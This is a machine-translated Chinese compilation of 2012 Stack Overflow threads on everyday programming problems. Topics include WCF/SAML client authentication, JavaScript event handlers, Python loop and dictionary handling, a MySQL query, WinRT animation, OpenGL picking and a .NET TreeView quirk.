            </saml:Attribute>
          </saml:AttributeStatement>
          </saml:Assertion>
        <u:Timestamp xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" u:Id="_0">
          <u:Created>2012-12-13T22:50:22.308Z</u:Created>
          <u:Expires>2012-12-13T22:55:22.308Z</u:Expires>
        </u:Timestamp>
        <o:UsernameToken xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" u:Id="uuid-91607d82-da2c-4004-93b6-baf5973ba057-1">
          <o:Username>
            <!-- Removed-->
          </o:Username>
          <o:Password>
            <!-- Removed-->
          </o:Password>
        </o:UsernameToken>
      </o:Security>
    </soapenv:Header>
    <soapenv:Body>
      <wn1:LoginResponse xmlns:wn1="http://snipped.url/Services.xsd">
        <wn1:Status>session counter updated</wn1:Status>
      </wn1:LoginResponse>
    </soapenv:Body>
</soapenv:Envelope> 
```

上述响应是一个成功的响应，并且与在 WSE2/3 上运行的先前版本相匹配（由于其他原因，我无法继续使用）。

如何让 WCF 确认上述响应有效？或者也许只是为了让它忽略它无法解析它的事实，我也许可以手动解析它。

我难住了！

**更新＃1：**

我开始走自定义客户端凭据路线。这看起来很有希望，虽然有点复杂。

如果你想走这条路...

1) 在此处查看 MS 文章系列：http: [//msdn.microsoft.com/en-us/library/ms730868 (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms730868(v=vs.100).aspx)

2) 另请参阅 WCF 示例 WCF\Extensibility\Security\SamlTokenProvider。

3）使用此方法的博客文章：http: [//bronumski.blogspot.com/2011/11/this-has-been-hanging-around-in-my.html](http://bronumski.blogspot.com/2011/11/this-has-been-hanging-around-in-my.html)

这应该允许您在没有 WIF 的情况下使用 SAML 断言。

**更新#2：**

请参阅下面的答案和最终解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-15T22:57:47.280

我建议为了获得 saml，不要使用 wcf 安全性。只需通过自定义标头（可能使用消息检查器）将用户名添加到请求中，并使用相同的方法从响应中提取 SAML。然后以同样的方式将 saml 推到每个进一步的信封中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T23:34:08.590

最终接受了 Yaron 的建议，并编写了几个自定义检查器和行为。

使用 proxy.ClientCredentials.UserName.UserName/Password 是上面报告的原始异常的原因。它会在处理后续添加的行为之前尝试并验证返回的 SOAP，从而导致每次 SAML 断言上的响应验证错误。

第一个行为/检查员有两个工作：

1）在请求端，手动添加UsernameToken节点；

2）在响应端，提取saml token；确保从 SOAP 中删除任何有问题的“安全”XML 节点并重新处理回复（防止出现类似原始帖子的另一个错误）；保存 SAML 响应以备后用。

第二个行为/检查器将共享 SAML 断言注入到请求的其余部分中。

这是所需的配置：

```
 <basicHttpBinding>
    <binding name="Default">
      <security mode="Transport">
        <transport clientCredentialType="None"/>
      </security>
    </binding>
  </basicHttpBinding> 
```

这是一些代码（注意删除了 ClientCredentials 行为）：

```
var proxy = new LoginClient();
proxy.ChannelFactory.Endpoint.Behaviors.Remove<ClientCredentials>();
var initLogin = new InitialLoginMessageBehavior("username", "password");
proxy.Endpoint.Behaviors.Add(initLogin);
var response = proxy.Login();

//use the SAML response
var proxy2 = new OtherClient();
proxy2.ChannelFactory.Endpoint.Behaviors.Remove<ClientCredentials>();
proxy2.Endpoint.Behaviors.Add(new SamlAuthenticationMessageBehavior(initLogin.Saml));

var response2 = proxy2.DoSomethingElse(); 
```

创建行为和检查器所需的一切：

[http://msdn.microsoft.com/en-us/library/aa717047(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/aa717047(v=vs.100).aspx)

[http://blogs.msdn.com/b/carlosfigueira/archive/2011/04/19/wcf-extensibility-message-inspectors.aspx](http://blogs.msdn.com/b/carlosfigueira/archive/2011/04/19/wcf-extensibility-message-inspectors.aspx)

# javascript - javascript在第一次点击后禁用事件监听器

> ID：13870230
> 
> 赞同：0
> 
> 时间：2012-12-13T23:16:25.523
> 
> 标签：javascript, events

如何禁用此事件侦听器以使其仅触发一次？

```
document.getElementById('element').ontouchmove = function (e) 
{   
  DISABLE HERE
  do something that should only happen once
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:20:07.143

```
document.getElementById('element').ontouchmove = function (e) {   
  this.ontouchmove = null;

  // Do something here.
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:19:42.783

首次执行后将布尔值设置为 false，每次在函数运行之前都会对其进行检查：

```
var doTouchEvent = true;
document.getElementById('element').ontouchmove = function (e) 
{   
   if(doTouchEvent){
      DISABLE HERE
      do something that should only happen once

      doTouchEvent = false;
   }
}; 
```

# python - Python：如何在使用“for”循环时获得更多控制？

> ID：13870232
> 
> 赞同：4
> 
> 时间：2012-12-13T23:16:30.653
> 
> 标签：python, for-loop

我有下面的代码，所以当任何异常发生时，重新做这个循环，而不是跳到下一个循环。请注意这里的伪代码确实按预期工作：

```
for cl in range(0, 10):
    try:
        some_function(cl)
    except :
        cl -= 1 
```

我的倡议是一旦出了问题，就再做一次。显然，这不是一个可行的想法。所以假设`for`循环和`range function`被使用，如何实现我描述的控制？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-13T23:20:03.187

您只需要在第一个循环中继续尝试该函数，直到它起作用：

```
for cl in range(0, 10):
    while True:
        try:
            some_function(cl)
        except Exception:
            continue    # try it again
        else:
            break       # exit inner loop, continue to next c1 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-13T23:18:29.613

为了更好地控制循环变量，您可能需要使用`while`循环：

```
cl = 0
while cl < 10:
    try:
        some_function(cl)
        cl += 1
    except:
        pass 
```

在 Python 中，该`pass`语句是一个“什么都不做”的占位符。如果出现异常，`cl`将再次尝试相同的值。

当然，您还需要添加一些机制，如果您*总是*遇到异常，您可以退出循环。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-13T23:28:00.393

因为我对循环有病态的仇恨`while True`，所以我建议简化@kindall 的答案：首先，改变`some_function()`它以使其`False`在失败时返回而不是抛出异常。然后，使用以下循环：

```
for cl in range(0, 10):
    while not some_function(cl): pass 
```

如果您不能（或不想） change `some_function()`，您可以添加一个包装器：

```
def exceptionless_function(arg):
    try:
        some_function(arg)
        return True
    except <known exceptions>:
        return False 
```

**编辑：**我在`<known exceptions>`上面添加以表明`except`应避免使用不合格条款。如果您不*知道*实际希望捕获哪些类型的异常，那么在某些情况下，简单地再次调用该函数*几乎肯定*是错误的行为。例如，OP 提到（在评论中）如果在重试此功能时发生超时，将会有“警报”。如果该警报碰巧以某种异常的形式出现，那么在“包罗万象”的情况下，它将被简单地忽略！

# javascript - 如何将功能放入我的空 []

> ID：13870233
> 
> 赞同：0
> 
> 时间：2012-12-13T23:16:33.167
> 
> 标签：javascript, underscore.js, template-engine

嘿，我写了一个函数 getNewId，它根据时间戳返回一个随机数

名称="位置[timestamp_from_function][街道]"

[这是我在http://jsfiddle.net/d0okie0612/22cTn/](http://jsfiddle.net/d0okie0612/22cTn/)上工作的小提琴

这是我的html

```
 <div id="container">
   <div id="top_form">
   <form>
    Street: <input class="street" name="locations[][street]" id="form_element" type="text">  <br><br>
       City: <input class="city" name="locations[][city]" id="form_element" type="text">
      <select>
        <option value=" ">State</option>
        <option value="ca">CA</option>
        <option value="az">AZ</option>
        <option value="de">DE</option>
        </select>
        Zip: <input name="locations[][zipcode]" type="text"><br /><br />
     </form>
   </div>
  </div>

 <br />
 <a href="#" id="awsomeButton">+ Add Location</a>
  <br /> 
```

提交

这是脚本

```
 var tpl = ""
     + "<div id='location_div_<%= id %>'><h1>My Location #<%= id %></h1></div>";

      var newId = new Date().getTime();
      var template = _.template(tpl);
       var compiled = template({id: newId});

       var addedForm = "<div id='added_form'>"
         + "<a href='#' class='close_btn'>x</a>"
         + "Street: <input name='locations[][street]' type='text'>"
          + "<br /><br />"
           + "City: <input name='locations[][city]' type='text'>"
           + "<select>"
           + "<option value=' '>State</option>"
           + "</select>"
           + "Zip: <input name='locations[][zipcode]' type='text'>"
            + "</div>"

           function getNewId() {
           var newId = new Date().getTime();
           return newId;
             }

            var myArray = [];
            $('#awsomeButton').on('click', function(e) {
            $(addedForm).hide().appendTo('form').fadeIn('slow');

            });

           $('.close_btn').live('click', function (e) {
           e.preventDefault();
           $(this).parents('div#added_form:first').fadeOut('slow', function() {
          $(this).remove();    

        });
         }); 
```

我觉得这应该很容易，但我迷路了，请帮忙

​ ​</p>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:28:04.247

```
$("#added_form input[name^=locations\\[\\]]").each(function(input){
   var name = input.attr("name");
   var match = name.match(/^locations\[\]\[(.*)\]$/)
   if(match.length > 1) {
      var newName = "locations["+getNewId()+"]["+match[1]+"]";
      input.attr("name", newName);
   }
}); 
```

# c - 使用 GPGME 在密钥服务器上搜索公钥

> ID：13870240
> 
> 赞同：5
> 
> 时间：2012-12-13T23:17:10.230
> 
> 标签：c, gnupg, gpgme

今天我在 gnupg 邮件列表上开始了一个新线程，[使用 GPGME 在密钥服务器上搜索密钥](http://lists.gnupg.org/pipermail/gnupg-devel/2012-December/027183.html)。基本上我使用 GPGME 作为在我的应用程序中使用 GnuPG 的接口，但我不知道如何使用 GPGME 函数来搜索密钥服务器上的密钥。

任何的想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T19:53:53.913

好的，我找到了这个问题的答案。使用**gpgme_op_conf_load**、**gpgme_conf_arg_new**、**gpgme_conf_opt_change**和**gpgme_op_conf_save**可以设置新的首选项，在这种情况下是密钥服务器 url。

——加油，何塞

# python - 自定义 dict 类的 ipython 选项卡完成

> ID：13870241
> 
> 赞同：15
> 
> 时间：2012-12-13T23:17:10.570
> 
> 标签：python

我一直在我的代码中使用以下内容：

```
class Structure(dict,object):
""" A 'fancy' dictionary that provides 'MatLab' structure-like
referencing. 

"""
def __getattr__(self, attr):
    # Fake a __getstate__ method that returns None
    if attr == "__getstate__":
        return lambda: None
    return self[attr]

def __setattr__(self, attr, value):
    self[attr] = value

def set_with_dict(self, D):
    """ set attributes with a dict """
    for k in D.keys():
        self.__setattr__(k, D[k]) 
```

总而言之，它适用于我的目的，但我注意到选项卡完成的唯一方法是用于从 Structure 继承的另一个自定义类中的方法，而不是用于属性。我也做了这个测试，我发现结果有点奇怪：

```
In [2]: d = Structure()
In [3]: d.this = 'that'
In [4]: d.this
Out[4]: 'that'
In [5]: d.th<tab>
NOTHING HAPPENS

In [6]: class T():
   ...:     pass
   ...: 

In [7]: t = T()
In [8]: t.this = 'cheese'
In [9]: t.th<tab>
COMPLETES TO t.this
Out[9]: 'cheese' 
```

我需要向我的班级添加什么才能使选项卡完成功能适用于属性？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-12-14T00:21:03.413

Add this method:

```
def __dir__(self):
    return self.keys() 
```

See here: [http://ipython.org/ipython-doc/dev/config/integrating.html](http://ipython.org/ipython-doc/dev/config/integrating.html)

And here: [http://docs.python.org/2/library/functions.html](http://docs.python.org/2/library/functions.html)

# mysql - 返回匹配所有请求项目的结果

> ID：13870243
> 
> 赞同：0
> 
> 时间：2012-12-13T23:17:22.560
> 
> 标签：mysql

我有一个包含这样数据的表：

```
+---------+---------+
| user_id | item_id |
+---------+---------+
|     125 |     375 |
|     125 |       2 |
|     125 |      12 |
|     125 |     375 |
|     283 |       2 |
|     283 |      11 |
|     118 |     375 |
|     118 |      12 |
+---------+---------+ 
```

我正在尝试创建一个查询，该查询将返回拥有所有请求项目的所有用户，在这种情况下，请求的项目是：

```
item_id IN (375, 12) 
```

所以这应该是结果：

```
+---------+
| user_id |
+---------+
|     125 |
|     118 |
+---------+ 
```

没有将表连接到自身，我不确定我将如何完成此操作。我想到的一个想法是将其分组：`user_id, item_id`然后可能对其进行计数，但这会将双重记录计`user_id: 125, item_id: 375`为 2，将 user_id 125 的总计数为 3，这有它自己的一组问题，例如返回两次拥有相同项目的用户与我真正需要的用户，即拥有两个请求项目的用户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:18:43.310

您可以使用`HAVING COUNT(DISTINCT item_id) = 2`，但我喜欢更明确一点——以下方法允许使用任意布尔逻辑：

```
SELECT   user_id
FROM     my_table
WHERE    item_id IN (375, 12)
GROUP BY user_id
HAVING   SUM(item_id = 375) AND SUM(item_id = 12) 
```

在[sqlfiddle](http://sqlfiddle.com/#!2/55a71/1/0)上查看。

这在 MySQL 中有效，因为它没有真正的布尔类型；相反，比较的“布尔”结果实际上是一个整数——`1`如果为真，`0`如果为假——因此，如果未找到匹配项，则组上的总和为零，否则为非零：这些术语可以与逻辑运算符组合，因为MySQL 的隐式类型转换回“布尔”类型。在其他 RDBMS 中，可能必须使用`CASE`：

```
HAVING   SUM(CASE WHEN item_id = 375 THEN 1 ELSE 0 END) > 0
     AND SUM(CASE WHEN item_id =  12 THEN 1 ELSE 0 END) > 0 
```

# python - 如何从迭代的字典中删除项目？

> ID：13870245
> 
> 赞同：0
> 
> 时间：2012-12-13T23:17:35.103
> 
> 标签：python, dictionary, loops

我有一本带时间戳的字典，我想遍历它并删除被认为过时的项目（在 Python 中）我该怎么做？这段代码给了我**RuntimeError: dictionary changed size during iteration**：

```
 for key, value in img_dict.iteritems() :
        if (time.time()-float(img_dict[key])) >= stale_img:
            logger.debug('STALE IMAGE FROM '+hexlify(key)+ ' - GOT CLOSED NOW!')
            del img_dict[key]
            data_upload = True 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:25:18.523

迭代集合时不能修改集合。

有几种方法可以解决这个问题：

*   (0) 重新考虑你的设计，看看你是否需要这样做。
*   （1）不要修改收藏；相反，构建一个新的过滤集合。
*   (2) 不要迭代集合；相反，迭代集合的副本
*   (2.5) 对于字典，遍历键的副本，并显式地获取值。

请注意，尽管对项目进行了迭代，但您已经明确地获取了值，因此这里没有理由使用 #2。

以下是其他两个的实现：

```
new_img_dict = {}
for key in img_dict:
    if (time.time()-float(img_dict[key])) >= stale_img:
        logger.debug('STALE IMAGE FROM '+hexlify(key)+ ' - GOT CLOSED NOW!')
        data_upload = True
   else:
       new_img_dict[key] = img_dict[key]
img_dict = new_img_dict 
```

或者：

```
for key in img_dict.keys():
    if (time.time()-float(img_dict[key])) >= stale_img:
        logger.debug('STALE IMAGE FROM '+hexlify(key)+ ' - GOT CLOSED NOW!')
        del img_dict[key]
        data_upload = True 
```

（如果您希望它与 Python 3 兼容，`img_dict.keys()`请不要使用`img_dict.keys()[:]`.）

那么，您如何在两者之间进行选择呢？

第一个通常更容易推理——一般来说，不可变对象和纯操作很容易推理。例如，如果您在某处抛出异常，`img_dict`将始终拥有原始版本或完成版本，而不是介于两者之间的东西。当然，您不必考虑在迭代时更改某些内容意味着什么。但是，在极少数情况下，很难将“删除 foo 的所有内容”算法转换为“复制不存在 foo 的所有内容”算法。

第一个通常也更容易重写为理解（或对高阶函数的调用，如`filter`），变成生成器，重构以提取单独的函数等。

对于性能，如果您要过滤掉许多值，第一个通常会更快并且使用更少的内存，而如果您保留大多数值，第二个通常会更好。（不同集合类型的截止值是不同的。通常情况下，它并不重要，如果确实如此，您应该同时编写方式和配置文件。）

回到#0，我认为它可能适用于这种情况。您正在遍历所有键以查看是否有任何键太旧，无法移除它们。例如，如果您使用排序列表或优先级队列，则不必这样做。现在，如果您需要`dict`更频繁地使用集合而不是刷新旧值，您可能会从更改数据结构中获得更多的成本而不是收益。但为什么不两者兼得？如果您有一个排序的键列表，在将键映射到值的字典之上，那么您可以这样做：

```
for key in img_sorted_key_list:
    if time.time() - float(key) > stale_img:
        break
    del img_dict[key] 
```

或者，更简单地说：

```
stale_time = time.time() - stale_img
for key in itertools.takewhile(lambda key: float(key) < stale_time, 
                               img_sorted_key_list):
    del img_dict[key] 
```

您可以将排序的键列表和字典一起包装成一个不错的`Cache`类或其他东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T01:43:52.083

看看这个例子。也许会有所帮助。请记住，当您删除列表或字典中的元素时，从末尾开始。避免使用*ititems()*方法。

```
keysMap = [
      {"key": 1 },
      {"key" : 2 },
      {"key" : 3 },
      {"key" : 4 },
      {"key" : 5 },
      {"key" : 6 }
       ]   
i=len(keysMap)-1
while i > 0 :
    key = keysMap[i]
    if key["key"]==2 :
        del(keysMap[i])
    i=i-1

# Printing the object data after deleting element key=2    
while i < len(keysMap) :
    key = keysMap[i]
    print key
    i=i+1 
```

# wpf - WinRT (C#/XAML) 缩放而不模糊

> ID：13870246
> 
> 赞同：11
> 
> 时间：2012-12-13T23:17:45.737
> 
> 标签：wpf, windows, xaml, windows-runtime

我已经整理了一个基本动画，它的控制比例从 0.1 到 1.0（x 和 y）。我一直看到的问题是上述控件在最终静止状态之前的“模糊”。

一个例子是我拍的这个屏幕摄像头。

[观看屏幕摄像头](https://vimeo.com/55519848)

我不确定是什么原因造成的。它是您将通过 Blend 生成的默认动画/故事板。

```
<DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(CompositeTransform.ScaleX)" Storyboard.TargetName="UIBorder" >
            <EasingDoubleKeyFrame KeyTime="0" Value="0.2">
                <EasingDoubleKeyFrame.EasingFunction>
                    <BackEase EasingMode="EaseInOut"/>
                </EasingDoubleKeyFrame.EasingFunction>
            </EasingDoubleKeyFrame>
            <EasingDoubleKeyFrame KeyTime="0:0:1.4" Value="1">
                <EasingDoubleKeyFrame.EasingFunction>
                    <BackEase EasingMode="EaseInOut" Amplitude="3"/>
                </EasingDoubleKeyFrame.EasingFunction>
            </EasingDoubleKeyFrame>
        </DoubleAnimationUsingKeyFrames> 
```

上述控制：

```
<Grid x:Name="UIBorder" Width="555"  HorizontalAlignment="Center" VerticalAlignment="Center" RenderTransformOrigin="0.5,0.5">
            <Grid.RenderTransform>
                <CompositeTransform ScaleY="0.2" ScaleX="0.2"/>
            </Grid.RenderTransform>

            <Grid Margin="122,0,0,0" RenderTransformOrigin="0.5,0.5" >
                <Border Background="#FF343434" ManipulationMode="None" IsDoubleTapEnabled="False" IsHoldingEnabled="False" IsRightTapEnabled="False" IsTapEnabled="False" RenderTransformOrigin="0.5,0.5"  >
                    <Border.RenderTransform>
                        <CompositeTransform/>
                    </Border.RenderTransform>
                </Border>
            </Grid>
            <Image HorizontalAlignment="Left" VerticalAlignment="Center" Source="ms-appx:///Assets/Chrome/LoginSeal.png" Stretch="None"/>
        </Grid> 
```

**笔记：**

*   我已经在 Windows 8 PC 和 Surface RT 平板电脑上从两个独立来源（即非硬件特定）确认了这种模糊。
*   我试过 BitmapCache 看看它是否有任何变化（变得更糟）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-14T16:25:38.010

似乎是一个错误。显然，WinRT 在动画期间自动将 CacheMode 转换为 BitmapCache，并以低比例缓存对象。虽然我无法重现您现在看到的内容，但在为 TextBlocks 的投影属性设置动画时，我在 Windows 8 的一个预发布版本中遇到了类似的问题。我认为可能发生的情况是它使用在开始动画之前使用的控件的最大大小来确定用于 BitmapCache 的 RenderAtScale 属性值（在 WinRT 中不可用，但存在于 Silverlight 或 WPF 中，它似乎是它的一个版本存在于 WinRT 中，只是不向 API 的用户公开）。一种解决方法可能是在加载位图时以某种方式不可见地将位图的 ScaleX/ScaleY 值设置为 1，然后在位图首次显示之前将其设置回 0.2。或者，您可以在动画开始之前将控件的不透明度设置为 0 并缩放为 1，然后在将缩放动画设置为 0.2 后淡入控件。如果您确实需要在动画之前显示小的控件-您可以拥有两个控件副本-一个小的控件在动画开始后立即消失，另一个开始大但不可见（或在 Opacity="0.005" ) 并在动画开始时很快动画到不透明度 1，比例 0.2。

这对我来说很好：

```
<Page
    x:Class="App76.MainPage"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:local="using:App76"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    mc:Ignorable="d">
    <Page.Resources>
        <Storyboard
            x:Name="anim"
            SpeedRatio="0.2">
            <DoubleAnimationUsingKeyFrames
                Storyboard.TargetProperty="(UIElement.RenderTransform).(CompositeTransform.ScaleX)"
                Storyboard.TargetName="UIBorder">
                <EasingDoubleKeyFrame
                    KeyTime="0"
                    Value="0.2">
                    <EasingDoubleKeyFrame.EasingFunction>
                        <BackEase
                            EasingMode="EaseInOut" />
                    </EasingDoubleKeyFrame.EasingFunction>
                </EasingDoubleKeyFrame>
                <EasingDoubleKeyFrame
                    KeyTime="0:0:1.4"
                    Value="1">
                    <EasingDoubleKeyFrame.EasingFunction>
                        <BackEase
                            EasingMode="EaseInOut"
                            Amplitude="3" />
                    </EasingDoubleKeyFrame.EasingFunction>
                </EasingDoubleKeyFrame>
            </DoubleAnimationUsingKeyFrames>
            <DoubleAnimationUsingKeyFrames
                Storyboard.TargetProperty="(UIElement.RenderTransform).(CompositeTransform.ScaleY)"
                Storyboard.TargetName="UIBorder">
                <EasingDoubleKeyFrame
                    KeyTime="0"
                    Value="0.2">
                    <EasingDoubleKeyFrame.EasingFunction>
                        <BackEase
                            EasingMode="EaseInOut" />
                    </EasingDoubleKeyFrame.EasingFunction>
                </EasingDoubleKeyFrame>
                <EasingDoubleKeyFrame
                    KeyTime="0:0:1.4"
                    Value="1">
                    <EasingDoubleKeyFrame.EasingFunction>
                        <BackEase
                            EasingMode="EaseInOut"
                            Amplitude="3" />
                    </EasingDoubleKeyFrame.EasingFunction>
                </EasingDoubleKeyFrame>
            </DoubleAnimationUsingKeyFrames>

        </Storyboard>
    </Page.Resources>
    <Grid
        Background="{StaticResource ApplicationPageBackgroundThemeBrush}">
        <Grid
            x:Name="UIBorder"
            Width="555"
            HorizontalAlignment="Center"
            VerticalAlignment="Center"
            RenderTransformOrigin="0.5,0.5">
            <!--<Grid.CacheMode>
                <BitmapCache
                    />
            </Grid.CacheMode>-->
            <Grid.RenderTransform>
                <CompositeTransform
                    x:Name="ct"
                    ScaleY="0.2"
                    ScaleX="0.2" />
            </Grid.RenderTransform>

            <Grid
                Margin="122,0,0,0"
                RenderTransformOrigin="0.5,0.5">
                <Border
                    Background="#FF343434"
                    ManipulationMode="None"
                    IsDoubleTapEnabled="False"
                    IsHoldingEnabled="False"
                    IsRightTapEnabled="False"
                    IsTapEnabled="False"
                    RenderTransformOrigin="0.5,0.5">
                    <Border.RenderTransform>
                        <CompositeTransform />
                    </Border.RenderTransform>
                </Border>
            </Grid>
            <Image
                HorizontalAlignment="Left"
                VerticalAlignment="Center"
                Source="ms-appx:///Assets/SplashScreen.png"
                Stretch="None" />
        </Grid>
        <Button
            VerticalAlignment="Bottom"
            HorizontalAlignment="Left"
            Content="TEST"
            Click="ButtonBase_OnClick" />
    </Grid>
</Page>

using Windows.UI.Xaml;
using Windows.UI.Xaml.Controls;

namespace App76
{
    public sealed partial class MainPage : Page
    {
        public MainPage()
        {
            this.InitializeComponent();
            ct.ScaleX = 1;
            ct.ScaleY = 1;
            this.Loaded += MainPage_Loaded;
        }

        void MainPage_Loaded(object sender, RoutedEventArgs e)
        {
            ct.ScaleX = 0.2;
            ct.ScaleY = 0.2;
        }

        private void ButtonBase_OnClick(object sender, RoutedEventArgs e)
        {
            anim.Begin();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:44:34.527

为 UIBorder 设置 UseLayoutRounding="True"

# objective-c - Xcode 视图在更改方向后不处理点击事件

> ID：13870247
> 
> 赞同：0
> 
> 时间：2012-12-13T23:17:51.660
> 
> 标签：objective-c, xcode, interface-builder, storyboard, uiinterfaceorientation

我找到了适用于 Android 的问题，但找不到适用于 Xcode 的问题，因此我创建了一个新问题。

我有一个具有三个子视图的 VC。在横向模式 -> 图像视图（左），图像细节视图（中心）和右侧的相关项目表视图。在纵向模式下，图像视图保留在左上角，图像细节保留在右上角，但相关的表格视图位于图像视图下方。我正在通过以下代码处理轮换。

```
 - (void) updateLayoutForNewOrientation: (UIInterfaceOrientation) orientation {
  CGRect detailsFrame = self.detailsView.frame;
  CGRect relatedFrame = self.relatedView.frame;
  if (UIInterfaceOrientationIsLandscape(orientation)) {
    detailsFrame.origin.x = 300.0f;
    detailsFrame.origin.y = 69.0f;
    relatedFrame.origin.x = 709.0f;
    relatedFrame.origin.y = 20.0f;
} else {
    detailsFrame.origin.x = 330.0f;
    detailsFrame.origin.y = 50.0f;
    relatedFrame.origin.x = 10.0f;
    relatedFrame.origin.y = 400.0f;
}
self.detailsView.frame = detailsFrame;
self.relatedView.frame = relatedFrame;
 } 
```

现在我的问题是我可以在横向模式下单击表格单元格或图像视图，但不能在纵向模式下单击表格视图单元格。我花了足够的时间找出可能出了什么问题，但找不到任何解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T04:35:52.717

方向也在 xib 而不是代码中处理。所以请在界面生成器中设置正确的自动调整大小掩码。请查看图表以更好地理解。

![自动调整蒙版](../Images/be2d51921262ea11a7c4d8538bae3bd5.png)
如果您有疑问，请问我。

# java - 找到立方体的哪一侧在屏幕的中心？

> ID：13870254
> 
> 赞同：3
> 
> 时间：2012-12-13T23:18:23.813
> 
> 标签：java, opengl, lwjgl, minecraft

我正在尝试通过制作我的世界克隆来学习 OpenGL 和 LWJGL，但我被卡住了

我能够轻松地渲染块并拥有带有 wasd 控件的第一人称相机，现在我正在尝试能够放置块，但我不知道如何才能检查哪个立方体以及该立方体的哪一侧我正在看/位于屏幕中央，因此我可以将另一个立方体放置在该立方体旁边。

我使用 gluPerspective 作为 3d 透视图，使用 glRotatef 旋转世界，这很正常

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:45:41.757

一种技术是使用 id-buffer。您可以使用帧缓冲区一次将场景绘制到两个纹理。第一个纹理将是典型的颜色纹理。第二个是存储整数的纹理。在绘制场景之前，为每个立方体面分配一个编号。您将这些数字传递给着色器（统一变量适用于此）。片段着色器会将这些数字“绘制”到整数纹理，同时对颜色纹理进行正常着色。当您需要查找鼠标光标处的内容时，请使用`glReadPixels()`.

这一切都假设您使用的是现代 OpenGL（3 或更好）。如果你被固定功能管道卡住了（跛脚），你还可以为每个立方体面分配一个唯一的颜色，并用纯色绘制到后台缓冲区。确保关闭纹理等。完成后，用于`glReadPixels()`查找在鼠标光标处绘制的内容。然后你再次正常绘制并交换缓冲区。（这里有一些过时的代码，显示了我在说什么：[http](http://www.lighthouse3d.com/opengl/picking/index.php3?color1) ://www.lighthouse3d.com/opengl/picking/index.php3?color1 ）

另一种技术是通过屏幕“投射光线”。基本上，您针对几何图形中的每个形状测试几个方程，如果这些测试通过，您就有了一个交集，并且您知道单击了哪个形状。我对这种方法不是很有经验，所以如果他们愿意，我会把它留给其他人解释。

# .net - .net TreeView 双击bug

> ID：13870259
> 
> 赞同：4
> 
> 时间：2012-12-13T23:18:32.400
> 
> 标签：.net, treeview

所以我在 blog-o-sphere 上看到了很多关于这个的讨论......但我不知道这是一个错误，还是只是我不理解的怪异行为......

说你有一个`TreeView`...`CheckBoxes`

`Double-click`在其中一个`CheckBox`上`Nodes`，然后再次单击该框...您会注意到状态似乎没有正确更改。

这是一个`bug`？？我总是很谨慎地说我在`.NET`...中发现了一个“错误”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-13T23:37:16.083

复制问题表明这绝对是一个错误*（故意星号）。因为当您双击 TreeView 中未选中的复选框时，调用代码如下：

```
For Each node As TreeNode In Me.TreeView1.Nodes
    Console.WriteLine("{0}: {1}", node.Name, node.Checked)
Next 
```

你会发现，虽然在视觉上它是未选中的，但节点认为它仍然是选中的。我可以看到发生了几件事：

1.  AfterCheck 事件在复选框双击期间被调用一次。
2.  从未选中节点的复选框开始并双击它，您会发现该节点认为它仍然处于选中状态（如上所述）。这也解释了为什么下次单击不会将复选框更改为选中。这是因为它认为它已被选中，因此将选中的属性设置为 false，这不会更改 UI。之后的下一次单击将其设置回预期的已选中。
3.  看起来复选框实际上以某种方式获得焦点。如果我双击树节点然后单击表单上的按钮，则需要单击两次。第一个是分散我认为是复选框的焦点，接下来是实际单击按钮。

我的结论是，不知何故，双击聚焦复选框，导致第二次鼠标点击不会发送到树节点，而是发送到复选框，这就是复选框未被选中并且树节点没有的原因 -更聪明。

**这是不应该发生的行为，如何分类，我将留给微软。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-10T13:57:43.370

我在树视图选择方面遇到了类似的问题。我管理了 Treeview.NodeMouseDoubleClick 事件，每个节点通过鼠标双击运行并执行不同的进程。但是当我双击树视图（而不是节点）时，代码已经崩溃。当我意识到 treeview.SelectedNode 与 Treeview.NodeMouseDoubleClick.TreeNodeMouseClickEventArgs e.Node 参数返回的不同时，我解决了这个问题。

因此，如果要在树视图上通过鼠标选择来选择节点，则需要准确地单击它。

希望这可以帮助。

# visual-studio-2010 - 从 TFS 到 Azure 的持续集成与 Visual Studio 部署不一致

> ID：13870262
> 
> 赞同：6
> 
> 时间：2012-12-13T23:18:45.527
> 
> 标签：visual-studio-2010, visual-studio, azure, tfs, tfsbuild

我们正在为我们的 ASP.net Web 应用程序迁移到 Azure 云服务（不是网站）。我们希望开始使用具有“持续集成”发布的 Team Foundation 服务，就像我们目前在 AppHarbor 和 GitHub 之间使用的一样。

